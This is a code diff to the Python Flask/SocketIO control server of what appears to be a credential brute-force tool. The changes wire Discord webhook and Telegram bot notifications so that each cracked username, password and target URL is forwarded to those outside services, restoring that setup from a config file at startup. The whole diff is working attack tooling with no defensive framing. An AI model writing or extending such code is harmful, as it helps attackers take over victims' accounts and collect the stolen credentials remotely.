@@ -67,6 +67,46 @@ _log_history_lock = threading.Lock()
 _MAX_LOG_HISTORY = 250
 
 
+def _sync_notifier_from_config(cfg: Dict[str, Any]) -> None:
+    """Sync Discord and Telegram backends dynamically from configuration dict."""
+    if not isinstance(cfg, dict):
+        return
+
+    discord_url = cfg.get("discord_url") or cfg.get("discordWebhook", "")
+    telegram_token = cfg.get("telegram_token") or cfg.get("telegramToken", "")
+    telegram_chat_id = cfg.get("telegram_chat_id") or cfg.get("telegramChatId", "")
+
+    if isinstance(discord_url, str) and discord_url.strip():
+        notifier.add_discord(discord_url.strip())
+    elif "discord_url" in cfg or "discordWebhook" in cfg:
+        notifier.remove_discord()
+
+    if (
+        isinstance(telegram_token, str)
+        and telegram_token.strip()
+        and isinstance(telegram_chat_id, str)
+        and telegram_chat_id.strip()
+    ):
+        notifier.add_telegram(telegram_token.strip(), telegram_chat_id.strip())
+    elif (
+        "telegram_token" in cfg
+        or "telegramToken" in cfg
+        or "telegram_chat_id" in cfg
+        or "telegramChatId" in cfg
+    ):
+        notifier.remove_telegram()
+
+
+# Restore saved notifications configuration on server startup
+if os.path.isfile(_CONFIG_FILE):
+    try:
+        with open(_CONFIG_FILE, "r", encoding="utf-8") as f:
+            _initial_cfg = json.load(f)
+            _sync_notifier_from_config(_initial_cfg)
+    except Exception:
+        pass
+
+
 # ═══════════════════════════════════════════════════════════════════
 # ENGINE CALLBACKS → SOCKETIO EVENTS
 # ═══════════════════════════════════════════════════════════════════
@@ -94,6 +134,7 @@ def _on_found(user: str, pwd: str, target_url: str) -> None:
     socketio.emit("credential_found", {"username": user, "password": pwd, "target_url": target_url})
     if notifier and notifier.has_backends:
         try:
+            _on_log(f"[+] 📢 Dispatching alert to notifications (User: '{user}')...")
             notifier.notify(
                 "credential_found",
                 {
@@ -102,8 +143,8 @@ def _on_found(user: str, pwd: str, target_url: str) -> None:
                     "target_url": target_url,
                 },
             )
-        except Exception:
-            pass
+        except Exception as exc:
+            _on_log(f"[-] Notification dispatch error: {exc}")
 
 
 def _on_finished(found: bool, message: str) -> None:
@@ -120,8 +161,8 @@ def _on_finished(found: bool, message: str) -> None:
                     "elapsed": m.get("elapsed", 0),
                 },
             )
-        except Exception:
-            pass
+        except Exception as exc:
+            _on_log(f"[-] Notification completion error: {exc}")
 
 
 def _wire_callbacks(eng: Any) -> None:
@@ -160,6 +201,7 @@ def start_attack():
         return jsonify({"status": "error", "message": "Attack already running."}), 409
 
     data = request.get_json(silent=True) or {}
+    _sync_notifier_from_config(data)
 
     # Parse attack mode
     attack_mode = data.get("mode", "browser").strip().lower()
@@ -531,6 +573,7 @@ def load_saved_config():
 def save_config_to_disk():
     """Save persistent UI configuration to disk."""
     data = request.get_json(silent=True) or {}
+    _sync_notifier_from_config(data)
     with _config_lock:
         try:
             with open(_CONFIG_FILE, "w", encoding="utf-8") as f:
@@ -543,6 +586,7 @@ def save_config_to_disk():
 @app.route("/api/config/reset", methods=["POST"])
 def reset_saved_config():
     """Reset saved configuration on disk."""
+    notifier.clear()
     with _config_lock:
         try:
             if os.path.isfile(_CONFIG_FILE):
@@ -561,16 +605,7 @@ def get_notification_config():
 @app.route("/api/notifications/configure", methods=["POST"])
 def configure_notifications():
     data = request.get_json(silent=True) or {}
-    if data.get("discord_url"):
-        notifier.add_discord(data["discord_url"])
-    elif "discord_url" in data and not data["discord_url"]:
-        notifier.remove_discord()
-
-    if data.get("telegram_token") and data.get("telegram_chat_id"):
-        notifier.add_telegram(data["telegram_token"], data["telegram_chat_id"])
-    elif "telegram_token" in data and not data["telegram_token"]:
-        notifier.remove_telegram()
-
+    _sync_notifier_from_config(data)
     return jsonify({"status": "ok", "config": notifier.get_config()})
 
 
